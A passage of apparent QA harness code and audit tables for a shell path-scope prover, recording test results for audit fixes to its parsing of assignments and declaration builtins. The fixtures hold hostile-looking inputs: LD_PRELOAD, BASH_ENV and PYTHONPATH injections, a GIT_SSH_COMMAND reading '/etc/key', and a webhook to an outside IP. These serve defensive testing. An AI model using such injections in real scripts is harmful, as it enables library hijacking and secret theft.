# C-4: the declaration builtins reached the repaired grammar only through a RAW
# ASSIGN_RE match, so every quoted declaration argument bypassed it. The family
# drives all five declaration keywords plus the env control, so the three
# assignment sites are re-audited as one grammar rather than as examples.
New-Fixture 'c3_ws_relative.sh'      @('#!/bin/bash', 'LD_PRELOAD="$ROOT/lib relative/escape.so" cat "$ROOT/f"')
New-Fixture 'c3_ws_later_word.sh'    @('#!/bin/bash', 'X="$ROOT/a plain" cat "$ROOT/f"')
New-Fixture 'c3_uri_list.sh'         @('#!/bin/bash', 'LD_LIBRARY_PATH=$URL:/etc/escape cat "$ROOT/f"')
New-Fixture 'c3_uri_pair.sh'         @('#!/bin/bash', 'X=$URL:http://198.51.100.10:9999/y cat "$ROOT/f"')
New-Fixture 'c3_colon_whole.sh'      @('#!/bin/bash', 'X=relative:$BASE cat "$ROOT/f"')
New-Fixture 'c3_empty_only.sh'       @('#!/bin/bash', 'LD_LIBRARY_PATH=: cat "$ROOT/f"')
New-Fixture 'c3_empty_only_out.sh'   @('#!/bin/bash', 'LD_LIBRARY_PATH=: cat "$ROOT/f"')
New-Fixture 'c3_cmdtext_noslash.sh'  @('#!/bin/bash', 'GIT_SSH_COMMAND="ssh -v" cat "$ROOT/f"')
New-Fixture 'c4_export_quoted.sh'    @('#!/bin/bash', 'export "LD_PRELOAD=/etc/escape.so"', 'cat "$ROOT/f"')
New-Fixture 'c4_export_quoted_space.sh' @('#!/bin/bash', 'export ''X=/safe dir/escape''', 'cat "$ROOT/f"')
New-Fixture 'c4_declare_quoted.sh'   @('#!/bin/bash', 'declare "LD_PRELOAD=/etc/escape.so"', 'cat "$ROOT/f"')
New-Fixture 'c4_readonly_quoted.sh'  @('#!/bin/bash', 'readonly "BASH_ENV=/etc/escape.sh"', 'cat "$ROOT/f"')
New-Fixture 'c4_typeset_quoted.sh'   @('#!/bin/bash', 'typeset "PYTHONPATH=$ROOT/lib:/etc/escape"', 'cat "$ROOT/f"')
New-Fixture 'c4_local_quoted.sh'     @('#!/bin/bash', 'f() { local "PERL5LIB=/etc/escape"; }', 'f', 'cat "$ROOT/f"')
New-Fixture 'c4_export_opaque.sh'    @('#!/bin/bash', 'export "not an assignment"', 'cat "$ROOT/f"')
New-Fixture 'c4_env_quoted_ctl.sh'   @('#!/bin/bash', 'env "LD_PRELOAD=/etc/escape.so" cat "$ROOT/f"')
New-Fixture 'c4_export_plain_ctl.sh' @('#!/bin/bash', 'export LD_PRELOAD="$ROOT/ok.so"', 'cat "$ROOT/f"')
New-Fixture 'c3_scalar_ctl.sh'       @('#!/bin/bash', 'LC_ALL=C count=1 cat "$ROOT/f"')

# --- the real blocks, extracted from their pinned committed blobs ---
Save-Blob '3c7b7d26a763f3904ea4fa4c0be3d39dc598c64c' 'RP6-P0.sh'
Save-Blob '5c9a2f597cceaef80d1cbd0fc100732f4b216cf5' 'RP7-WPI-RO.sh'
foreach ($b in @('RP6-P0.sh', 'RP7-WPI-RO.sh')) {
  "BLOCK $b bytes=$(Get-Size $b) sha256=$(Get-Sha256 $b) git_blob=$(Get-BlobId $b)"
}
New-Fixture 'real.constants' @(
  'WPI_CANDIDATE_SHA=2ce41e34bceb599d80af24c5c33d835820ec321b',
  'WPI_RELEASE_ROOT=/opt/mtc-bridge/releases/2ce41e34bceb599d80af24c5c33d835820ec321b',
  'WPI_VENV_ROOT=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b',
  'WPI_UNIT_FRAGMENT=/usr/local/lib/systemd/system/mtc-bridge-first-start.service',
  'WPI_STATE_DIR=/var/lib/mtc-bridge',
  'WPI_LOG_DIR=/var/log/mtc-bridge',
  'WPI_CONF_DIR=/etc/mtc-bridge',
  'WPI_CONTROL_ENDPOINT=http://127.0.0.1:8790/api/status',
  'P0_VENV_ROOT=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b',
  'REMOTE_BASE=/home/gatea/wpi_staging_STAGE1_STATIC_BINDING')
New-Fixture 'real.allowlist' @(
  '<WPI_RELEASE_ROOT>/**',
  '<WPI_VENV_ROOT>/**',
  '<WPI_UNIT_FRAGMENT>',
  'terminal:<WPI_CONF_DIR>',
  'terminal:<WPI_STATE_DIR>',
  'terminal:<WPI_LOG_DIR>',
  '<REMOTE_BASE>/**',
  '127.0.0.1:8790')
New-Fixture 'placeholder.constants' @(
  'WPI_CANDIDATE_SHA=2ce41e34bceb599d80af24c5c33d835820ec321b',
  'WPI_RELEASE_ROOT=/opt/mtc-bridge/releases/2ce41e34bceb599d80af24c5c33d835820ec321b',
  'WPI_VENV_ROOT=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b',
  'WPI_UNIT_FRAGMENT=/usr/local/lib/systemd/system/mtc-bridge-first-start.service',
  'WPI_STATE_DIR=/var/lib/mtc-bridge',
  'WPI_LOG_DIR=/var/log/mtc-bridge',
  'WPI_CONF_DIR=/etc/mtc-bridge',
  'WPI_CONTROL_ENDPOINT=http://127.0.0.1:8790/api/status',
  'P0_VENV_ROOT=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b',
  'REMOTE_BASE=/home/gatea/wpi_staging_<ALLOCATE-AT-DISPATCH>')

# --- the case list: fixture, constants, allowlist ---
$CASES = @(
  @('green','constants.env','allowlist.txt'),
  @('literal','constants.env','allowlist.txt'),
  @('assembled','constants.env','allowlist.txt'),
  @('dynamic','constants.env','allowlist.txt'),
  @('nested','constants.env','allowlist.txt'),
  @('pushd','constants.env','allowlist.txt'),
  @('pushd_forbidden','constants.env','allowlist.txt'),
  @('popd_stack','constants.env','allowlist.txt'),
  @('trap','constants.env','allowlist.txt'),
  @('ssh','constants.env','allowlist.txt'),
  @('ssh_command','constants.env','allowlist.txt'),
  @('getent','constants.env','allowlist.txt'),
  @('find_exec','constants.env','allowlist.txt'),
  @('find_unknown','constants.env','allowlist.txt'),
  @('curl_upload','constants.env','allowlist.txt'),
  @('curl_net','constants.env','allowlist.txt'),
  @('tar_option','constants.env','allowlist.txt'),
  @('cp_option','constants.env','allowlist.txt'),
  @('cp_unknown','constants.env','allowlist.txt'),
  @('python_c','constants.env','allowlist.txt'),
  @('alias','constants.env','allowlist.txt'),
  @('hash_p','constants.env','allowlist.txt'),
  @('mapfile_cb','constants.env','allowlist.txt'),
  @('systemctl_link','constants.env','allowlist.txt'),
  @('jobs_x','constants.env','allowlist.txt'),
  @('tilde','constants.env','allowlist.txt'),
  @('tilde_user','constants.env','allowlist.txt'),
  @('tilde_home','constants_home.env','allowlist.txt'),
  @('symlink_lexical','constants.env','allowlist.txt'),
  @('redir_rw','constants.env','allowlist.txt'),
  @('redir_clobber','constants.env','allowlist.txt'),
  @('redir_amp','constants.env','allowlist.txt'),
  @('fddup','constants.env','allowlist.txt'),
  @('exec_redir','constants.env','allowlist.txt'),
  @('devtcp','constants.env','allowlist.txt'),
  @('devtcp_allow','constants.env','allowlist.txt'),
  @('heredoc','constants.env','allowlist.txt'),
  @('heredoc_subst','constants.env','allowlist.txt'),
  @('heredoc_quoted','constants.env','allowlist.txt'),
  @('herestring','constants.env','allowlist.txt'),
  @('array','constants.env','allowlist.txt'),
  @('brace','constants.env','allowlist.txt'),
  @('arith','constants.env','allowlist.txt'),
  @('param_default','constants.env','allowlist.txt'),
  @('param_subst','constants.env','allowlist.txt'),
  @('ansic','constants.env','allowlist.txt'),
  @('continuation','constants.env','allowlist.txt'),
  @('backtick','constants.env','allowlist.txt'),
  @('glob','constants.env','allowlist.txt'),
  @('source','constants.env','allowlist.txt'),
  @('dot_source','constants.env','allowlist.txt'),
  @('xargs','constants.env','allowlist.txt'),
  @('multipath','constants.env','allowlist.txt'),
  @('scp_remote','constants.env','allowlist.txt'),
  @('nc_client','constants.env','allowlist.txt'),
  @('grep_files','constants.env','allowlist.txt'),
  @('sed_prog','constants.env','allowlist.txt'),
  @('func_positional','constants.env','allowlist.txt'),
  @('func_body','constants.env','allowlist.txt'),
  @('case_loop','constants.env','allowlist.txt'),
  @('terminal_stat','constants.env','allowlist_terminal.txt'),
  @('terminal_cat','constants.env','allowlist_terminal.txt'),
  @('assign_prefix','constants.env','allowlist.txt'),
  @('assign_prefix_allow','constants.env','allowlist.txt'),
  @('assign_bare','constants.env','allowlist.txt'),
  @('assign_benign','constants.env','allowlist.txt'),
  @('assign_export','constants.env','allowlist.txt'),
  @('assign_env','constants.env','allowlist.txt'),
  @('assign_multi','constants.env','allowlist.txt')
)

# The C-2 family is run against three provers: round 1, the round-3 pre-repair
# subject of that finding, and the repaired bytes.
$C2CASES = @(
  @('c2_list_prefix','constants.env','allowlist.txt'),
  @('c2_list_env','constants.env','allowlist.txt'),
  @('c2_list_export','constants.env','allowlist.txt'),
  @('c2_list_bare_first','constants.env','allowlist.txt'),
  @('c2_list_space','constants.env','allowlist.txt'),
  @('c2_relative','constants_pwd_outside.env','allowlist.txt'),
  @('c2_empty_member','constants.env','allowlist.txt'),
  @('c2_quoted_space','constants.env','allowlist.txt'),
  @('c2_escaped_space','constants.env','allowlist.txt'),
  @('c2_command_text','constants.env','allowlist.txt'),
  @('c2_uri_forbid','constants.env','allowlist.txt'),
  @('c2_uri_allow','constants.env','allowlist.txt'),
  @('c2_env_quoted','constants.env','allowlist.txt'),
  @('c2_bare_soname','constants.env','allowlist.txt'),
  @('c2_allow_list','constants.env','allowlist.txt'),
  @('c2_benign_scalars','constants.env','allowlist.txt'),
  @('c2_benign_words','constants.env','allowlist.txt'),
  @('c2_words_with_path','constants.env','allowlist.txt')
)
# The C-3/C-4 family is run against the committed round-4 blob - the exact bytes
# the final Codex T1 audit rejected - and against the repaired bytes.
$C3CASES = @(
  @('c3_ws_relative','constants_pwd_outside.env','allowlist.txt'),
  @('c3_ws_later_word','constants.env','allowlist.txt'),
  @('c3_uri_list','constants.env','allowlist.txt'),
  @('c3_uri_pair','constants.env','allowlist.txt'),
  @('c3_colon_whole','constants_base.env','allowlist_base.txt'),
  @('c3_empty_only','constants.env','allowlist.txt'),
  @('c3_empty_only_out','constants_pwd_outside.env','allowlist.txt'),
  @('c3_cmdtext_noslash','constants.env','allowlist.txt'),
  @('c4_export_quoted','constants.env','allowlist.txt'),
  @('c4_export_quoted_space','constants.env','allowlist.txt'),
  @('c4_declare_quoted','constants.env','allowlist.txt'),
  @('c4_readonly_quoted','constants.env','allowlist.txt'),
  @('c4_typeset_quoted','constants.env','allowlist.txt'),
  @('c4_local_quoted','constants.env','allowlist.txt'),
  @('c4_export_opaque','constants.env','allowlist.txt'),
  @('c4_env_quoted_ctl','constants.env','allowlist.txt'),
  @('c4_export_plain_ctl','constants.env','allowlist.txt'),
  @('c3_scalar_ctl','constants.env','allowlist.txt')
)
$CASES = $CASES + $C2CASES + $C3CASES

# Every prover argument below is a bare file name resolved against $QA, which is
# the current directory for the whole run. No user-specific absolute path can
# therefore enter a transcript, and no `<QA>` substitution is needed or made.
Push-Location -LiteralPath $QA

function Invoke-Suite([string]$Prover, [string]$OutFile, [object[]]$List, [bool]$WithBlocks) {
  if ($null -eq $List) { $List = $CASES }
  $lines = New-Object System.Collections.Generic.List[string]
  foreach ($case in $List) {
    $name, $constants, $allowlist = $case
    $lines.Add("=== $name ===")
    $out = & python -B $Prover "$name.sh" $constants $allowlist 2>&1
    $rc = $LASTEXITCODE
    foreach ($line in $out) { $lines.Add([string]$line) }
    $lines.Add("COMMAND_RC=$rc")
  }
  if ($WithBlocks) {
  foreach ($pair in @(@('RP6-P0','placeholder.constants'), @('RP7-WPI-RO','placeholder.constants'),
                      @('RP6-P0','real.constants'), @('RP7-WPI-RO','real.constants'))) {
    $block, $constants = $pair
    $lines.Add("=== $block with $constants ===")
    $out = & python -B $Prover "$block.sh" $constants 'real.allowlist' 2>&1
    $rc = $LASTEXITCODE
    foreach ($line in $out) { $lines.Add([string]$line) }
    $lines.Add("COMMAND_RC=$rc")
  }
  }
  # Fail closed: a transcript that carries a machine-specific path is not
  # reproducible evidence, and round 4 shipped one silently.
  foreach ($line in $lines) {
    if ($line.Contains($QA) -or $line.Contains($TEMPROOT) -or $line.Contains($REPO)) {
      throw "TRANSCRIPT_LEAK $OutFile : $line"
    }
  }
  [System.IO.File]::WriteAllText((Join-Path $QA $OutFile), (($lines -join "`n") + "`n"))
  "WROTE $OutFile lines=$($lines.Count) sha256=$(Get-Sha256 $OutFile)"
}

Invoke-Suite 'pathscope_prover_R1.py' 'RED_R1.txt' $CASES   $true
Invoke-Suite $TOOL                    'GREEN_R5.txt' $CASES $true
Invoke-Suite 'pathscope_prover_R3.py' 'RED_R3.txt' $C2CASES $false
Invoke-Suite 'pathscope_prover_R4.py' 'RED_R4.txt' ($C2CASES + $C3CASES) $false

# --- determinism: same input, same bytes, same order ---
foreach ($pair in @(@('find_exec','constants.env','allowlist.txt'),
                    @('assign_prefix','constants.env','allowlist.txt'),
                    @('c2_list_prefix','constants.env','allowlist.txt'),
                    @('c3_ws_relative','constants_pwd_outside.env','allowlist.txt'),
                    @('c4_export_quoted','constants.env','allowlist.txt'),
                    @('RP6-P0','real.constants','real.allowlist'),
                    @('RP7-WPI-RO','real.constants','real.allowlist'))) {
  $name, $constants, $allowlist = $pair
  $a = (& python -B $TOOL "$name.sh" $constants $allowlist 2>&1) -join "`n"
  $ra = $LASTEXITCODE
  $b = (& python -B $TOOL "$name.sh" $constants $allowlist 2>&1) -join "`n"
  $rb = $LASTEXITCODE
  $sha = [System.Security.Cryptography.SHA256]::Create()
  $ha = ([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($a)))).Replace('-','').ToLowerInvariant()
  $hb = ([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($b)))).Replace('-','').ToLowerInvariant()
  "DETERMINISM $name rc1=$ra rc2=$rb equal=$($a -ceq $b) sha1=$ha sha2=$hb"
}

Pop-Location
```

## Round 3 — C-1 repair (assignment-prefix silent sink, family P9)

**Status: EXECUTED 2026-08-13 by the Lead — all seven predictions CONFIRMED by
measurement.** The table below was written as an implementer prediction; the Lead's run of
the complete harness confirmed every row. Measured results (exact lines from the run's
`RED_R1.txt` / `GREEN_R2.txt`):

```text
assign_prefix       R1: PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted   (silent sink)
assign_prefix       R2: PATH value=/etc/evil.so verdict=FORBID uses=line=2:assignment prefix → REJECT rc=1
assign_export       R1: PASS rc=0 (sink)  R2: PATH value=/etc/evil.so verdict=FORBID uses=line=2:export assignment → REJECT rc=1
assign_env          R1: PASS rc=0 (sink)  R2: PATH value=/etc/evil.so verdict=FORBID uses=line=2:env assignment → REJECT rc=1
assign_multi        R1: PASS rc=0 (sink)  R2: /etc/a.so FORBID + /etc/b.sh FORBID → REJECT rc=1
assign_bare         R1: PASS rc=0 (sink)  R2: PATH value=/etc/passwd verdict=FORBID → REJECT rc=1
assign_prefix_allow R1: rc=0              R2: /safe/ok.so ALLOW-LEXICAL + /safe/f ALLOW-LEXICAL → PASS rc=0 (control holds)
assign_benign       R1: rc=0              R2: /safe/f ALLOW-LEXICAL → PASS rc=0 (control holds)
```

| fixture | shell fragment | hole | R1 RED (predicted) | R2 GREEN (predicted) |
|---|---|---|---|---|
| `assign_prefix` | `LD_PRELOAD=/etc/evil.so cat "$ROOT/f"` | prefix loop | rc 0 — /safe/f ALLOW (sink: `/etc/evil.so` invisible) | rc 1 — `/etc/evil.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `assign_prefix_allow` | `LD_PRELOAD="$ROOT/ok.so" cat "$ROOT/f"` | prefix loop | rc 0 — /safe/f ALLOW (allowlisted path also invisible) | rc 0 — `/safe/ok.so` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL |
| `assign_bare` | `X=/etc/passwd` | prefix loop (bare) | rc 0 — (no row) | rc 1 — `/etc/passwd` FORBID |
| `assign_benign` | `IFS=: cat "$ROOT/f"` | prefix loop (control) | rc 0 — /safe/f ALLOW | rc 0 — /safe/f ALLOW-LEXICAL (no false positive) |
| `assign_export` | `export LD_PRELOAD=/etc/evil.so` ; `cat "$ROOT/f"` | declaration builtin | rc 0 — /safe/f ALLOW (sink) | rc 1 — `/etc/evil.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `assign_env` | `env LD_PRELOAD=/etc/evil.so cat "$ROOT/f"` | env wrapper | rc 0 — /safe/f ALLOW (sink) | rc 1 — `/etc/evil.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `assign_multi` | `LD_PRELOAD=/etc/a.so BASH_ENV=/etc/b.sh cat "$ROOT/f"` | prefix loop (×2) | rc 0 — /safe/f ALLOW (both dropped) | rc 1 — `/etc/a.so` FORBID; `/etc/b.sh` FORBID; `/safe/f` ALLOW-LEXICAL |

The R1 RED predictions assume round 1 already dropped assignment values (the defect class
predates round 2); `assign_env`/`assign_export` R1 behaviour in particular must be
**measured**, not trusted. The `cat "$ROOT/f"` operand resolves to `/safe/f` in every row
because `ROOT=/safe`.

## Round 4 — C-2 repair (assignment-value MEMBER grammar, family P10)

**Status: RE-EXECUTED 2026-08-14 at round 5. Every cell below is measured, not
predicted**, read out of `RED_R1.txt`, `RED_R3.txt`, `RED_R4.txt` and `GREEN_R5.txt` by the
generator that wrote this file. `R3` is the committed round-3 blob
`e600a107f2e2a790653cc544a94cd7436b7b070a` — the bytes the C-2 finding rejected. `R4` is
the committed round-4 blob `55ea3a852f7781d03d57483f554c1b8ac62007c6` — the bytes the C-3
and C-4 findings rejected. `R5` is this repair. The C-2 closures are therefore shown to
survive the round-5 grammar change rather than being asserted to.

| fixture | shell fragment | R1 rc | R3 rc | R4 rc | R5 rc | round-5 terminal accounting |
|---|---|---:|---:|---:|---:|---|
| `c2_list_prefix` | `LD_LIBRARY_PATH=$ROOT/lib:/etc/escape cat "$ROOT/f"` | 0 | 0 | 1 | 1 | `/etc/escape` FORBID; `/safe/f` ALLOW-LEXICAL; `/safe/lib` ALLOW-LEXICAL; `/safe/lib:/etc/escape` ALLOW-LEXICAL |
| `c2_list_env` | `env LD_LIBRARY_PATH=$ROOT/lib:/etc/escape cat "$ROOT/f"` | 0 | 0 | 1 | 1 | `/etc/escape` FORBID; `/safe/f` ALLOW-LEXICAL; `/safe/lib` ALLOW-LEXICAL; `/safe/lib:/etc/escape` ALLOW-LEXICAL |
| `c2_list_export` | `export LD_LIBRARY_PATH=$ROOT/lib:/etc/escape ; cat "$ROOT/f"` | 0 | 0 | 1 | 1 | `/etc/escape` FORBID; `/safe/f` ALLOW-LEXICAL; `/safe/lib` ALLOW-LEXICAL; `/safe/lib:/etc/escape` ALLOW-LEXICAL |
| `c2_list_bare_first` | `LD_PRELOAD=bare.so:/etc/escape.so cat "$ROOT/f"` | 0 | 0 | 1 | 3 | `/etc/escape.so` FORBID; `/safe/bare.so:/etc/escape.so` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 provenance record |
| `c2_list_space` | `LD_PRELOAD="bare.so /etc/escape.so" cat "$ROOT/f"` | 0 | 0 | 3 | 3 | `/etc/escape.so` FORBID; `/safe/bare.so /etc/escape.so` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 coverage record; 1 provenance record |
| `c2_relative` | `LD_PRELOAD=relative/path.so cat "$ROOT/f"` | 0 | 0 | 1 | 1 | `/elsewhere/relative/path.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c2_empty_member` | `LD_LIBRARY_PATH=:/etc/escape cat "$ROOT/f"` | 0 | 0 | 3 | 3 | `/etc/escape` FORBID; `/safe` ALLOW-LEXICAL; `/safe/:/etc/escape` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 provenance record |
| `c2_quoted_space` | `X="$ROOT dir/escape" cat "$ROOT/f"` | 0 | 1 | 1 | 3 | `/safe` ALLOW-LEXICAL; `/safe dir/escape` FORBID; `/safe/dir/escape` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 coverage record |
| `c2_escaped_space` | `X=$ROOT/a\ b:/etc/escape cat "$ROOT/f"` | 0 | 0 | 1 | 3 | `/etc/escape` FORBID; `/safe/a` ALLOW-LEXICAL; `/safe/a b` ALLOW-LEXICAL; `/safe/a b:/etc/escape` ALLOW-LEXICAL; `/safe/b:/etc/escape` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 coverage record |
| `c2_command_text` | `GIT_SSH_COMMAND="ssh -i /etc/key" cat "$ROOT/f"` | 0 | 0 | 3 | 3 | `/etc/key` FORBID; `/safe/f` ALLOW-LEXICAL; `/safe/ssh -i /etc/key` ALLOW-LEXICAL; 1 coverage record; 1 provenance record |
| `c2_uri_forbid` | `WEBHOOK=http://198.51.100.10:9999/x cat "$ROOT/f"` | 0 | 0 | 1 | 1 | `/safe/f` ALLOW-LEXICAL; `198.51.100.10:9999` FORBID |
| `c2_uri_allow` | `WEBHOOK="$URL" cat "$ROOT/f"` | 0 | 0 | 0 | 0 | `/safe/f` ALLOW-LEXICAL; `127.0.0.1:8790` ALLOW-LEXICAL |
| `c2_env_quoted` | `env "LD_PRELOAD=/etc/evil.so" cat "$ROOT/f"` | 0 | 0 | 1 | 1 | `/etc/evil.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c2_bare_soname` | `LD_PRELOAD=libc.so cat "$ROOT/f"` | 0 | 0 | 0 | 0 | `/safe/f` ALLOW-LEXICAL |
| `c2_allow_list` | `LD_LIBRARY_PATH=$ROOT/lib:$ROOT/lib64 cat "$ROOT/f"` | 0 | 0 | 0 | 0 | `/safe/f` ALLOW-LEXICAL; `/safe/lib` ALLOW-LEXICAL; `/safe/lib64` ALLOW-LEXICAL; `/safe/lib:/safe/lib64` ALLOW-LEXICAL |
| `c2_benign_scalars` | `IFS=: LC_ALL=C count=1 cat "$ROOT/f"` | 0 | 0 | 0 | 0 | `/safe` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL |
| `c2_benign_words` | `MSG="Permission denied" cat "$ROOT/f"` | 0 | 0 | 0 | 0 | `/safe/f` ALLOW-LEXICAL |
| `c2_words_with_path` | `MSG="denied /etc/secret" cat "$ROOT/f"` | 0 | 0 | 3 | 3 | `/etc/secret` FORBID; `/safe/denied /etc/secret` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 coverage record; 1 provenance record |

Every out-of-allowlist lexeme that round 4 printed is still printed at round 5; no FORBID
row was lost. Eight of these eighteen fixtures changed shape at round 5 — `c2_list_bare_first`,
`c2_list_space`, `c2_empty_member`, `c2_quoted_space`, `c2_escaped_space`, `c2_command_text`,
`c2_benign_scalars` and `c2_words_with_path` — and each change is itemised, with its
discriminating-power proof, under *Carried fences that changed* below.

## Round 5 — C-3 and C-4 repair (member conservation and declaration reachability, family P11)

**Status: EXECUTED 2026-08-14. Every cell below is measured.** The RED column is the
committed round-4 blob, run by the harness itself, so it is the actual rejected bytes and
not a prediction. Eight fixtures carry C-3, eight carry C-4, and the last two are controls
whose verdict must not move.

| fixture | shell fragment | R1 rc | R4 rc (pre-repair) | R5 rc | round-5 terminal accounting |
|---|---|---:|---:|---:|---|
| `c3_ws_relative` | `LD_PRELOAD="$ROOT/lib relative/escape.so" cat "$ROOT/f"` | 0 | 0 | 3 | `/elsewhere/relative/escape.so` FORBID; `/safe/f` ALLOW-LEXICAL; `/safe/lib` ALLOW-LEXICAL; `/safe/lib relative/escape.so` ALLOW-LEXICAL; 1 coverage record |
| `c3_ws_later_word` | `X="$ROOT/a plain" cat "$ROOT/f"` | 0 | 0 | 3 | `/safe/a` ALLOW-LEXICAL; `/safe/a plain` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 coverage record |
| `c3_uri_list` | `LD_LIBRARY_PATH=$URL:/etc/escape cat "$ROOT/f"` | 0 | 0 | 1 | `/etc/escape` FORBID; `/safe/f` ALLOW-LEXICAL; `127.0.0.1:8790` ALLOW-LEXICAL |
| `c3_uri_pair` | `X=$URL:http://198.51.100.10:9999/y cat "$ROOT/f"` | 0 | 0 | 1 | `/safe/f` ALLOW-LEXICAL; `127.0.0.1:8790` ALLOW-LEXICAL; `198.51.100.10:9999` FORBID |
| `c3_colon_whole` | `X=relative:$BASE cat "$ROOT/f"` | 0 | 0 | 1 | `/safe/dir/file` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; `/safe/relative:dir/file` FORBID |
| `c3_empty_only` | `LD_LIBRARY_PATH=: cat "$ROOT/f"` | 0 | 0 | 0 | `/safe` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL |
| `c3_empty_only_out` | `LD_LIBRARY_PATH=: cat "$ROOT/f"` | 0 | 0 | 1 | `/elsewhere` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c3_cmdtext_noslash` | `GIT_SSH_COMMAND="ssh -v" cat "$ROOT/f"` | 0 | 0 | 3 | `/safe/f` ALLOW-LEXICAL; 1 coverage record |
| `c4_export_quoted` | `export "LD_PRELOAD=/etc/escape.so" ; cat "$ROOT/f"` | 0 | 0 | 1 | `/etc/escape.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c4_export_quoted_space` | `export 'X=/safe dir/escape' ; cat "$ROOT/f"` | 0 | 0 | 3 | `/safe` ALLOW-LEXICAL; `/safe dir/escape` FORBID; `/safe/dir/escape` ALLOW-LEXICAL; `/safe/f` ALLOW-LEXICAL; 1 coverage record; 1 provenance record |
| `c4_declare_quoted` | `declare "LD_PRELOAD=/etc/escape.so" ; cat "$ROOT/f"` | 0 | 0 | 1 | `/etc/escape.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c4_readonly_quoted` | `readonly "BASH_ENV=/etc/escape.sh" ; cat "$ROOT/f"` | 0 | 0 | 1 | `/etc/escape.sh` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c4_typeset_quoted` | `typeset "PYTHONPATH=$ROOT/lib:/etc/escape" ; cat "$ROOT/f"` | 0 | 0 | 1 | `/etc/escape` FORBID; `/safe/f` ALLOW-LEXICAL; `/safe/lib` ALLOW-LEXICAL; `/safe/lib:/etc/escape` ALLOW-LEXICAL |
| `c4_local_quoted` | `f() { local "PERL5LIB=/etc/escape"; } ; f ; cat "$ROOT/f"` | 0 | 0 | 1 | `/etc/escape` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c4_export_opaque` | `export "not an assignment" ; cat "$ROOT/f"` | 0 | 0 | 3 | `/safe/f` ALLOW-LEXICAL; 1 coverage record |
| `c4_env_quoted_ctl` | `env "LD_PRELOAD=/etc/escape.so" cat "$ROOT/f"` | 0 | 1 | 1 | `/etc/escape.so` FORBID; `/safe/f` ALLOW-LEXICAL |
| `c4_export_plain_ctl` | `export LD_PRELOAD="$ROOT/ok.so" ; cat "$ROOT/f"` | 0 | 0 | 0 | `/safe/f` ALLOW-LEXICAL; `/safe/ok.so` ALLOW-LEXICAL |
| `c3_scalar_ctl` | `LC_ALL=C count=1 cat "$ROOT/f"` | 0 | 0 | 0 | `/safe/f` ALLOW-LEXICAL |

Mapping to the audit's required list:

| audit item | fixture | pre-repair behaviour on the committed bytes | round-5 behaviour |
|---|---|---|---|
| C-3.1 whitespace list with a later relative member | `c3_ws_relative` | rc 0; only the allowed whole value `/safe/lib relative/escape.so`; the consumer's `/elsewhere/relative/escape.so` had no disposition | rc 3; `/elsewhere/relative/escape.so` FORBID, whole value and `/safe/lib` also accounted, one coverage record |
| C-3.1 (generalised) later word behind an fs-shaped first word | `c3_ws_later_word` | rc 0; only the whole value | rc 3; the whole value, `/safe/a` and the coverage record |
| C-3.2 URI-shaped loader list with a later absolute member | `c3_uri_list` | rc 0; allowed endpoint only, `/etc/escape` absent | rc 1; `/etc/escape` FORBID plus the endpoint |
| C-3.2 (generalised) two URIs in one list | `c3_uri_pair` | rc 0; the second endpoint absent | rc 1; `198.51.100.10:9999` FORBID plus the allowed endpoint |
| C-3.3 colon-bearing whole pathname reading | `c3_colon_whole` | rc 0; the admitted single-pathname reading emitted no row | rc 1; `/safe/relative:dir/file` FORBID alongside the allowed member |
| C-3.4 empty-only loader list | `c3_empty_only` | rc 0; **no assignment row at all** | rc 0 **with a row**: the empty member resolves to the pinned PWD `/safe` |
| C-3.4 (the case that matters) empty member naming a CWD outside scope | `c3_empty_only_out` | rc 0; nothing | rc 1; `/elsewhere` FORBID |
| C-3.5 executable command text without `/` | `c3_cmdtext_noslash` | rc 0; nothing | rc 3; one coverage record naming the word-list/command-text reading |
| C-4 `export "LD_PRELOAD=/etc/escape.so"` | `c4_export_quoted` | rc 0; `/etc/escape.so` absent | rc 1; `/etc/escape.so` FORBID |
| C-4 `export 'X=/safe dir/escape'` | `c4_export_quoted_space` | rc 0; nothing | rc 3; `/safe dir/escape` FORBID, unsplit, plus the word-list members and a coverage record |
| C-4 one grammar, not examples | `c4_declare_quoted`, `c4_readonly_quoted`, `c4_typeset_quoted`, `c4_local_quoted` | rc 0 for all four | rc 1 for all four |
| C-4 fail-closed on an unparsable operand | `c4_export_opaque` | rc 0; silently ignored | rc 3; a specific coverage record |
| C-4 control that already worked | `c4_env_quoted_ctl` | rc 1 | rc 1, unchanged |
| controls that must not move | `c4_export_plain_ctl`, `c3_scalar_ctl` | rc 0 | rc 0 |

### The rule, stated so it can be attacked

`record_assignment_members` (`pathscope_prover.py`) decides on the grammar of the value,
never on the variable name:

1. **URI.** A value or member matching `^[A-Za-z][A-Za-z0-9+.-]*://` belongs to the
   **endpoint** domain. Only its `scheme://authority` span is protected from colon
   splitting; a colon after the authority is a list separator, and a member that itself
   begins a new URI re-arms the protection.
2. **Whitespace.** The lexer guarantees an assignment word contains no *unquoted*
   whitespace and the shell does not word-split assignment values, so `X="$ROOT
